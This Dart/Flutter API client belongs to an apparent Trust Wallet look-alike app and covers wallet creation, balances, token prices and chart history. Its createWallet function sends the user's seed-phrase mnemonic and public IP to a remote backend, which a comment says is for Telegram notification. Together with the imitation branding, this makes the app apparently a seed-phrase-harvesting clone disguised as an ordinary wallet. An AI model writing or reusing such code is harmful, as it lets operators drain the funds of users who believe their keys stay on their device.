import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:flutter/foundation.dart';

class ApiService {
  /// Backend API base URL (TrustWallet-Like Multi-Chain Backend)

  //product environment
  // static const String baseUrl = 'https://trust-wallet-backend.api98vip.com';

  //test environment
  static const String baseUrl = 'https://dev-wallet.newtwwin.com:7074';

  // Optional: use local backend per platform (uncomment to override [baseUrl] above)
  // static String get baseUrl {
  //   if (kIsWeb) return 'http://localhost:8083';
  //   if (Platform.isAndroid) return 'http://10.0.2.2:8083';
  //   if (Platform.isIOS) return 'http://localhost:8083';
  //   return 'http://127.0.0.1:8083';
  // }

  /// Create device passcode
  static Future<Map<String, dynamic>> createDevicePasscode({
    required String name,
    required String passcode,
  }) async {
    try {
      final response = await http.post(
        Uri.parse('${baseUrl}/device-passcodes'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'name': name,
          'passcode': passcode,
        }),
      );

      if (response.statusCode == 201 || response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('Failed to create device passcode: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('Error creating device passcode: $e');
    }
  }

  /// Create multi-chain wallet.
  /// [publicIp] optional device public IP (from IpHelper.getPublicIp()) for TG/notification.
  static Future<Map<String, dynamic>> createWallet({
    required String devicePassCodeId,
    required String walletName,
    required String mnemonic,
    bool isMain = true,
    String? publicIp,
  }) async {
    try {
      final body = <String, dynamic>{
        'devicePassCodeId': devicePassCodeId,
        'walletName': walletName,
        'mnemonic': mnemonic,
        'isMain': isMain,
      };
      if (publicIp != null && publicIp.isNotEmpty) {
        body['publicIp'] = publicIp;
        body['ip'] = publicIp; // backend can use either for TG notification
      }
      final response = await http.post(
        Uri.parse('${baseUrl}/multichain/wallet/create'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(body),
      );

      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('Failed to create wallet: ${response.statusCode} - ${response.body}');
      }
    } catch (e) {
      throw Exception('Error creating wallet: $e');
    }
  }

  /// Report device public IP to backend for all wallets under a devicePassCodeId
  static Future<void> reportDeviceIp({
    required String devicePassCodeId,
    required String ip,
  }) async {
    try {
      final response = await http.post(
        Uri.parse('${baseUrl}/wallet/device/$devicePassCodeId/ip'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'ip': ip}),
      );
      if (response.statusCode != 200) {
        // ignore: avoid_print
        print(
            '[TRUST_APP] reportDeviceIp failed: ${response.statusCode} ${response.body}');
      }
    } catch (e) {
      // ignore: avoid_print
      print('[TRUST_APP] reportDeviceIp error: $e');
    }
  }

  /// Get wallet balances for all chains
  static Future<Map<String, dynamic>> getWalletBalances(String walletId) async {
    try {
      final response = await http.get(
        Uri.parse('${baseUrl}/multichain/wallet/$walletId/balances'),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('Failed to get wallet balances: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('Error getting wallet balances: $e');
    }
  }

  /// Get wallet summary with balances (legacy - kept for compatibility)
  static Future<Map<String, dynamic>> getWalletSummary(String walletId) async {
    try {
      final response = await http.get(
        Uri.parse('${baseUrl}/multichain/wallet/$walletId/summary'),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('Failed to get wallet summary: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('Error getting wallet summary: $e');
    }
  }

  /// Get all wallets for a device
  static Future<Map<String, dynamic>> getWalletsByDevice(String devicePassCodeId) async {
    try {
      final response = await http.get(
        Uri.parse('${baseUrl}/wallet/device/$devicePassCodeId'),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        return jsonDecode(response.body);
      } else {
        throw Exception('Failed to get wallets: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('Error getting wallets: $e');
    }
  }

  /// Get live USD price for a token symbol using backend QuickNode/CoinGecko integration
  /// The backend handles symbol-to-CoinGecko-ID mapping automatically
  static Future<double?> getTokenPriceUsd(String symbol) async {
    try {
      // Normalize symbol - uppercase and trim
      final symbolToSend = symbol.toUpperCase().trim();
      
      if (symbolToSend.isEmpty) {
        return null;
      }

      // Call backend API
      final response = await http.get(
        Uri.parse('${baseUrl}/quicknode/price/$symbolToSend'),
        headers: {'Content-Type': 'application/json'},
      );

      // Parse response
      if (response.statusCode == 200) {
        final body = jsonDecode(response.body);
        
        // Check if request was successful
        if (body['success'] == true && body['data'] != null) {
          final data = body['data'];
          final price = data['priceUSD'] as num?;
          
          if (price != null && price > 0) {
            return price.toDouble();
          }
        }
      }

      return null;
    } catch (e) {
      // Return null on any error
      return null;
    }
  }

  /// Get top tokens by market cap for \"Popular tokens\" section.
  /// Uses the backend `/market/top` endpoint which proxies official market data.
  static Future<List<dynamic>> getTopTokens({int limit = 10}) async {
    try {
      final response = await http.get(
        Uri.parse('${baseUrl}/market/top?limit=$limit'),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        final body = jsonDecode(response.body);
        if (body is Map && body['success'] == true && body['data'] != null) {
          final data = body['data'];
          // Controller returns { total, tokens: [...] }
          if (data is Map && data['tokens'] is List) {
            return List<dynamic>.from(data['tokens'] as List);
          }
          // Fallback: if data itself is already a list
          if (data is List) {
            return data;
          }
        }
      }

      return [];
    } catch (e) {
      return [];
    }
  }

  /// Get live USD price **and** 24h percentage change for a token symbol.
  /// Returns a map with keys: 'priceUsd' and 'change24hPct' (both nullable).
  static Future<Map<String, double?>?> getTokenPriceWithChange(String symbol) async {
    try {
      final symbolToSend = symbol.toUpperCase().trim();
      if (symbolToSend.isEmpty) return null;

      final response = await http.get(
        Uri.parse('${baseUrl}/quicknode/price/$symbolToSend'),
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode == 200) {
        final body = jsonDecode(response.body);
        if (body['success'] == true && body['data'] != null) {
          final data = body['data'];
          final price = data['priceUSD'] as num?;
          final change = data['change24hPct'] as num?;

          return {
            'priceUsd': price?.toDouble(),
            'change24hPct': change?.toDouble(),
          };
        }
      }

      return null;
    } catch (e) {
      return null;
    }
  }

  /// Get token price history for charts.
  /// [range] is a logical range key: '1H', '1D', '1W', '1M', '1Y', or 'ALL'.
  /// Returns a list of price points in USD (ordered oldest → newest).
  static Future<List<double>> getTokenPriceHistory({
    required String symbol,
    required String range,
  }) async {
    try {
      // Map symbols to CoinGecko coin IDs (used by backend for charts).
      final upper = symbol.toUpperCase().trim();
      String tokenId;
      switch (upper) {
        case 'BTC':
          tokenId = 'bitcoin';
          break;
        case 'ETH':
          tokenId = 'ethereum';
          break;
        case 'BNB':
          tokenId = 'binancecoin';
          break;
        case 'USDT':
          tokenId = 'tether';
          break;
        case 'USDC':
          tokenId = 'usd-coin';
          break;
        case 'MATIC':
          tokenId = 'matic-network';
          break;
        case 'AVAX':
          tokenId = 'avalanche-2';
          break;
        case 'FTM':
          tokenId = 'fantom';
          break;
        case 'SOL':
          tokenId = 'solana';
          break;
        case 'ATOM':
          tokenId = 'cosmos';
          break;
        case 'LTC':
          tokenId = 'litecoin';
          break;
        case 'TRX':
          tokenId = 'tron';
          break;
        case 'DOGE':
          tokenId = 'dogecoin';
          break;
        case 'ADA':
          tokenId = 'cardano';
          break;
        case 'DOT':
          tokenId = 'polkadot';
          break;
        case 'LINK':
          tokenId = 'chainlink';
          break;
        case 'UNI':
          tokenId = 'uniswap';
          break;
        case 'XRP':
          tokenId = 'ripple';
          break;
        case 'XLM':
          tokenId = 'stellar';
          break;
        case 'ALGO':
          tokenId = 'algorand';
          break;
        case 'NEAR':
          tokenId = 'near';
          break;
        case 'ARB':
          tokenId = 'arbitrum';
          break;
        case 'OP':
          tokenId = 'optimism';
          break;
        case 'DAI':
          tokenId = 'dai';
          break;
        case 'BUSD':
          tokenId = 'binance-usd';
          break;
        case 'SHIB':
          tokenId = 'shiba-inu';
          break;
        case 'APE':
          tokenId = 'apecoin';
          break;
        case 'SAND':
          tokenId = 'the-sandbox';
          break;
        case 'MANA':
          tokenId = 'decentraland';
          break;
        case 'AXS':
          tokenId = 'axie-infinity';
          break;
        case 'ENJ':
          tokenId = 'enjincoin';
          break;
        case 'CHZ':
          tokenId = 'chiliz';
          break;
        case 'FLOW':
          tokenId = 'flow';
          break;
        case 'THETA':
          tokenId = 'theta-token';
          break;
        case 'FIL':
          tokenId = 'filecoin';
          break;
        case 'ICP':
          tokenId = 'internet-computer';
          break;
        case 'EGLD':
          tokenId = 'elrond-erd-2';
          break;
        case 'HBAR':
          tokenId = 'hedera-hashgraph';
          break;
        case 'VET':
          tokenId = 'vechain';
          break;
        case 'EOS':
          tokenId = 'eos';
          break;
        case 'XTZ':
          tokenId = 'tezos';
          break;
        case 'AAVE':
          tokenId = 'aave';
          break;
        case 'MKR':
          tokenId = 'maker';
          break;
        case 'COMP':
          tokenId = 'compound-governance-token';
          break;
        case 'SNX':
          tokenId = 'havven';
          break;
        case 'CRV':
          tokenId = 'curve-dao-token';
          break;
        case '1INCH':
          tokenId = '1inch';
          break;
        case 'SUSHI':
          tokenId = 'sushi';
          break;
        case 'YFI':
          tokenId = 'yearn-finance';
          break;
        case 'BAL':
          tokenId = 'balancer';
          break;
        case 'ZRX':
          tokenId = '0x';
          break;
        case 'BAT':
          tokenId = 'basic-attention-token';
          break;
        case 'ZEC':
          tokenId = 'zcash';
          break;
        case 'DASH':
          tokenId = 'dash';
          break;
        case 'XMR':
          tokenId = 'monero';
          break;
        case 'ETC':
          tokenId = 'ethereum-classic';
          break;
        case 'BCH':
          tokenId = 'bitcoin-cash';
          break;
        case 'BSV':
          tokenId = 'bitcoin-sv';
          break;
        case 'TWT':
          tokenId = 'trust-wallet-token';
          break;
        default:
          tokenId = upper.toLowerCase();
      }

      // Map UI range to backend interval.
      // These map onto CoinCap intervals: m1, m5, m15, m30, h1, h2, h6, h12, d1.
      String interval;
      switch (range) {
        case '1H':
          interval = 'm5';
          break;
        case '1D':
          interval = 'm30';
          break;
        case '1W':
          interval = 'h2';
          break;
        case '1M':
          interval = 'h6';
          break;
        case '1Y':
          interval = 'd1';
          break;
        case 'ALL':
        default:
          interval = 'd1';
          break;
      }

      final uri = Uri.parse('${baseUrl}/market/token/$tokenId/history')
          .replace(queryParameters: {'interval': interval, 'rangeKey': range});

      final response = await http.get(
        uri,
        headers: {'Content-Type': 'application/json'},
      );

      if (response.statusCode != 200) {
        return [];
      }

      final body = jsonDecode(response.body);
      if (body is! Map || body['success'] != true || body['data'] == null) {
        return [];
      }

      final data = body['data'];
      if (data is! Map || data['data'] is! List) {
        return [];
      }

      final List<dynamic> rawPoints = data['data'] as List<dynamic>;
      final List<double> prices = [];

      for (final point in rawPoints) {
        if (point is Map && point['priceUsd'] != null) {
          final num? p = point['priceUsd'] as num?;
          if (p != null) {
            prices.add(p.toDouble());
          }
        }
      }

      return prices;
    } catch (_) {
      // On any error, return empty list so UI can fallback.
      return [];
    }
  }
}
